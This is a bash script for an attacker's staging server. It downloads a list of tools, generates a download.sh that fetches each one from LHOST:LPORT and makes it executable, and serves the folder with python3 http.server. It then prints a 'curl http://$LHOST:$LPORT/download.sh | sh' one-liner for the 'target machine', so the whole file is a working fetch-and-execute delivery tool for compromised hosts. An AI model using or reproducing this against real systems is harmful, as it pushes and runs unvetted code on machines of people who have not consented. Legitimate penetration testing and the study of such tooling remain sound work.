#!/bin/bash

if [ $# != 2 ]; then
  echo "Usage: $0 <LHOST> <LPORT>"
  echo ""
  exit 1
fi

LHOST=$1
LPORT=$2
TOOL_URLS=$(cat tools-to-download.txt)

mkdir www
cd www

echo "#!/bin/sh" > download.sh

for TOOL_URL in $TOOL_URLS; do
    
    TOOL_NAME=$(echo $TOOL_URL | rev | cut -d'/' -f 1 | rev)

    echo "Downloading '$TOOL_NAME'..."
    if [ ! -f "$TOOL_NAME" ]; then
        wget $TOOL_URL -O $TOOL_NAME -q
    fi
    echo "wget http://$LHOST:$LPORT/$TOOL_NAME; chmod +x $TOOL_NAME" >> download.sh

done

echo ""
echo ""
echo "Use 'curl' piped into 'sh' to download all scripts to your target machine"
echo ""
echo "curl http://$LHOST:$LPORT/download.sh | sh"
echo ""

if [ $LPORT -lt 1024 ]; then
  echo "Port is less than 1024, you need to provide your sudo password..."
  sudo python3 -m http.server $LPORT
else
  python3 -m http.server $LPORT
fi

